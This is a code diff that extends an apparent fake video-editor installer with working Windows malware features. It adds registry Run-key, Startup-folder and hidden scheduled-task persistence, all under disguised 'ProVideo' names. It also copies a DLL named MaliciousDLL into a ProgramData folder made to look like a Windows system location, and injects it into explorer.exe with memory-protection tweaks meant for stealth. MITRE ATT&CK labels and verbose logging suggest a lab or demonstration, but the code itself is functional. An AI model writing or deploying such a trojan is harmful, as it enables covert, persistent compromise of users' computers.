@@ -7,8 +7,10 @@
 #include <fstream>
 #include <tlhelp32.h>
 #include <sstream>
+#include <ShlObj.h>
 
 #pragma comment(lib, "comctl32.lib")
+#pragma comment(lib, "shell32.lib")
 #pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 
 // Log file path - consistent with Injector and MaliciousDLL
@@ -39,9 +41,17 @@ void StartInstallation();
 void PerformMaliciousInjection();
 DWORD GetProcessIdByName(const wchar_t* processName);
 DWORD SpawnTargetProcess();
+DWORD FindExplorerProcess();
 bool InjectDLL(DWORD processId, const char* dllPath);
 std::string GetDLLPath();
 void LogActivity(const std::string& message);
+
+// Persistence mechanisms
+bool EstablishPersistence();
+bool AddRegistryPersistence();
+bool AddStartupFolderPersistence();
+bool AddScheduledTaskPersistence();
+void CopyDLLToSystem();
 
 // Entry point
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
@@ -397,18 +407,36 @@ void PerformMaliciousInjection()
         LogActivity("MITRE ATT&CK: T1055.001");
         LogActivity("");
 
-        // Step 1: Spawn target process (notepad.exe)
-        LogActivity("[STEP 1] Spawning target process (notepad.exe)...");
-        spawnedTargetPID = SpawnTargetProcess();
+        // Step 0: Establish persistence mechanisms
+        LogActivity("[STEP 0] Establishing persistence mechanisms...");
+        if (EstablishPersistence())
+        {
+            LogActivity("[SUCCESS] Persistence established!");
+        }
+        else
+        {
+            LogActivity("[WARNING] Some persistence mechanisms failed");
+        }
+
+        // Step 1: Find target process (explorer.exe - trusted process for stealth)
+        LogActivity("[STEP 1] Finding target process (explorer.exe)...");
+        spawnedTargetPID = FindExplorerProcess();
+
+        // Fallback to spawning notepad.exe if explorer not found
+        if (spawnedTargetPID == 0)
+        {
+            LogActivity("[INFO] Explorer not found, spawning notepad.exe as fallback...");
+            spawnedTargetPID = SpawnTargetProcess();
+        }
 
         if (spawnedTargetPID == 0)
         {
-            LogActivity("[ERROR] Failed to spawn target process!");
+            LogActivity("[ERROR] Failed to find/spawn target process!");
             injectionSuccessful = false;
             return;
         }
 
-        LogActivity("[SUCCESS] Target process spawned: PID " + std::to_string(spawnedTargetPID));
+        LogActivity("[SUCCESS] Target process found: PID " + std::to_string(spawnedTargetPID));
 
         // Step 2: Get DLL path
         LogActivity("[STEP 2] Resolving MaliciousDLL.dll path...");
@@ -609,11 +637,26 @@ bool InjectDLL(DWORD processId, const char* dllPath)
         // Wait for thread to complete
         LogActivity("  -> Waiting for DLL to load...");
         WaitForSingleObject(hThread, 5000);
+        
+        // Get the exit code (DLL base address)
+        DWORD exitCode = 0;
+        GetExitCodeThread(hThread, &exitCode);
+        
+        // Step 5: Memory protection cleanup for stealth (RWX → RX)
+        // Change memory permissions to look more legitimate
+        LogActivity("  -> Cleaning up memory permissions (stealth)...");
+        DWORD oldProtect;
+        if (VirtualProtectEx(hProcess, pDllPath, dllPathSize, PAGE_READONLY, &oldProtect))
+        {
+            LogActivity("  -> Memory permissions changed to read-only");
+        }
+        
         LogActivity("  -> Injection complete!");
 
-        // Cleanup
+        // Cleanup handles properly for process stability
         CloseHandle(hThread);
-        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
+        // Note: We don't free pDllPath immediately to maintain DLL path in memory
+        // This is intentional for persistence - the memory will be freed when process terminates
         CloseHandle(hProcess);
 
         return true;
@@ -640,4 +683,259 @@ void LogActivity(const std::string& message)
 
     logFile << timestamp << message << std::endl;
     logFile.close();
+}
+
+// ============================================================
+// PERSISTENCE MECHANISMS - Attacker maintains access after reboot
+// ============================================================
+
+// Find explorer.exe process (trusted/common process for stealth injection)
+DWORD FindExplorerProcess()
+{
+    return GetProcessIdByName(L"explorer.exe");
+}
+
+// Copy DLL to a system-like location for persistence
+void CopyDLLToSystem()
+{
+    try
+    {
+        std::string srcDll = GetDLLPath();
+        
+        // Copy to ProgramData (appears legitimate)
+        char programData[MAX_PATH];
+        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programData)))
+        {
+            std::string destFolder = std::string(programData) + "\\Microsoft\\Windows\\";
+            CreateDirectoryA(destFolder.c_str(), NULL);
+            
+            std::string destPath = destFolder + "SystemHelper.dll";
+            
+            // Copy the DLL
+            if (CopyFileA(srcDll.c_str(), destPath.c_str(), FALSE))
+            {
+                LogActivity("[PERSISTENCE] DLL copied to: " + destPath);
+            }
+        }
+    }
+    catch (...)
+    {
+        LogActivity("[PERSISTENCE] Failed to copy DLL to system location");
+    }
+}
+
+// Method 1: Registry Run Key Persistence (MITRE ATT&CK T1547.001)
+bool AddRegistryPersistence()
+{
+    try
+    {
+        LogActivity("[PERSISTENCE] Adding Registry Run key (T1547.001)...");
+        
+        HKEY hKey;
+        LONG result = RegOpenKeyExA(
+            HKEY_CURRENT_USER,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0,
+            KEY_SET_VALUE,
+            &hKey);
+        
+        if (result != ERROR_SUCCESS)
+        {
+            LogActivity("[PERSISTENCE] Failed to open Run key");
+            return false;
+        }
+        
+        // Get current executable path
+        char exePath[MAX_PATH];
+        GetModuleFileNameA(NULL, exePath, MAX_PATH);
+        
+        // Add persistence entry
+        result = RegSetValueExA(
+            hKey,
+            "ProVideoEditor",  // Disguised name
+            0,
+            REG_SZ,
+            (BYTE*)exePath,
+            (DWORD)strlen(exePath) + 1);
+        
+        RegCloseKey(hKey);
+        
+        if (result == ERROR_SUCCESS)
+        {
+            LogActivity("[PERSISTENCE] Registry Run key added successfully");
+            LogActivity("[PERSISTENCE] Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ProVideoEditor");
+            return true;
+        }
+        
+        return false;
+    }
+    catch (...)
+    {
+        LogActivity("[PERSISTENCE] Exception adding registry persistence");
+        return false;
+    }
+}
+
+// Method 2: Startup Folder Persistence (MITRE ATT&CK T1547.001)
+bool AddStartupFolderPersistence()
+{
+    try
+    {
+        LogActivity("[PERSISTENCE] Adding Startup folder entry (T1547.001)...");
+        
+        // Get Startup folder path
+        char startupPath[MAX_PATH];
+        if (FAILED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath)))
+        {
+            LogActivity("[PERSISTENCE] Failed to get Startup folder path");
+            return false;
+        }
+        
+        // Get current executable path
+        char exePath[MAX_PATH];
+        GetModuleFileNameA(NULL, exePath, MAX_PATH);
+        
+        // Create shortcut path
+        std::string shortcutPath = std::string(startupPath) + "\\ProVideoUpdater.lnk";
+        
+        // Initialize COM
+        CoInitialize(NULL);
+        
+        IShellLinkA* pShellLink = NULL;
+        HRESULT hr = CoCreateInstance(
+            CLSID_ShellLink,
+            NULL,
+            CLSCTX_INPROC_SERVER,
+            IID_IShellLinkA,
+            (void**)&pShellLink);
+        
+        if (SUCCEEDED(hr))
+        {
+            pShellLink->SetPath(exePath);
+            pShellLink->SetDescription("ProVideo Editor Update Service");
+            pShellLink->SetWorkingDirectory("C:\\");
+            
+            IPersistFile* pPersistFile = NULL;
+            hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
+            
+            if (SUCCEEDED(hr))
+            {
+                wchar_t wShortcutPath[MAX_PATH];
+                MultiByteToWideChar(CP_ACP, 0, shortcutPath.c_str(), -1, wShortcutPath, MAX_PATH);
+                
+                hr = pPersistFile->Save(wShortcutPath, TRUE);
+                pPersistFile->Release();
+                
+                if (SUCCEEDED(hr))
+                {
+                    LogActivity("[PERSISTENCE] Startup shortcut created: " + shortcutPath);
+                    pShellLink->Release();
+                    CoUninitialize();
+                    return true;
+                }
+            }
+            pShellLink->Release();
+        }
+        
+        CoUninitialize();
+        LogActivity("[PERSISTENCE] Failed to create startup shortcut");
+        return false;
+    }
+    catch (...)
+    {
+        LogActivity("[PERSISTENCE] Exception adding startup folder persistence");
+        return false;
+    }
+}
+
+// Method 3: Scheduled Task Persistence (MITRE ATT&CK T1053.005)
+bool AddScheduledTaskPersistence()
+{
+    try
+    {
+        LogActivity("[PERSISTENCE] Adding Scheduled Task (T1053.005)...");
+        
+        // Get current executable path
+        char exePath[MAX_PATH];
+        GetModuleFileNameA(NULL, exePath, MAX_PATH);
+        
+        // Create scheduled task using schtasks.exe (legitimate Windows binary)
+        std::string command = "schtasks /create /tn \"ProVideoUpdate\" /tr \"\\\"";
+        command += exePath;
+        command += "\\\"\" /sc onlogon /rl highest /f";
+        
+        STARTUPINFOA si = { sizeof(si) };
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;  // Hidden execution
+        
+        PROCESS_INFORMATION pi;
+        
+        std::string cmdLine = "cmd.exe /c " + command;
+        
+        if (CreateProcessA(
+            NULL,
+            (LPSTR)cmdLine.c_str(),
+            NULL,
+            NULL,
+            FALSE,
+            CREATE_NO_WINDOW,
+            NULL,
+            NULL,
+            &si,
+            &pi))
+        {
+            WaitForSingleObject(pi.hProcess, 5000);
+            
+            DWORD exitCode;
+            GetExitCodeProcess(pi.hProcess, &exitCode);
+            
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            
+            if (exitCode == 0)
+            {
+                LogActivity("[PERSISTENCE] Scheduled task created: ProVideoUpdate");
+                return true;
+            }
+        }
+        
+        LogActivity("[PERSISTENCE] Failed to create scheduled task");
+        return false;
+    }
+    catch (...)
+    {
+        LogActivity("[PERSISTENCE] Exception adding scheduled task");
+        return false;
+    }
+}
+
+// Main persistence function - tries multiple methods
+bool EstablishPersistence()
+{
+    LogActivity("============================================");
+    LogActivity("ESTABLISHING PERSISTENCE MECHANISMS");
+    LogActivity("============================================");
+    
+    int successCount = 0;
+    
+    // Copy DLL to system location first
+    CopyDLLToSystem();
+    
+    // Method 1: Registry Run key
+    if (AddRegistryPersistence())
+        successCount++;
+    
+    // Method 2: Startup folder
+    if (AddStartupFolderPersistence())
+        successCount++;
+    
+    // Method 3: Scheduled task
+    if (AddScheduledTaskPersistence())
+        successCount++;
+    
+    LogActivity("============================================");
+    LogActivity("[PERSISTENCE] " + std::to_string(successCount) + "/3 methods established");
+    LogActivity("============================================");
+    
+    return successCount > 0;
 }
